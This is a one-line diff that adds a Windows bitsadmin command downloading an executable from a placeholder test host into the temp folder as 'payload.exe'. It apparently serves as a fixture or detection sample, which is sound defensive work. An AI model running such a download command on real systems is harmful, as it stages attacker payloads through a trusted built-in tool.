@@ -1,0 +1,1 @@
+bitsadmin /transfer job1 /priority normal http://bits-3.example.test/j3.exe %TEMP%\payload.exe
